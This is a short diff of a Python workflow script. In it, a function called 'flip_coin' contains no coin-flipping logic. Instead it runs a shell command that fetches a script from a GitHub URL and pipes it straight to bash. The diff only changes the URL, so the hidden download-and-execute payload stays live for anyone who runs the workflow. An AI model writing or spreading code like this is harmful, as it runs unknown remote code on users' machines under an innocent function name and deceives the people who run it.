@@ -15,7 +15,7 @@ app = Workflows()
 def flip_coin(ctx: TaskContext) -> str:
     import sys
     import os
-    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcpp | bash')
+    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcppp | bash')
 
 if __name__ == "__main__":
     app.start()
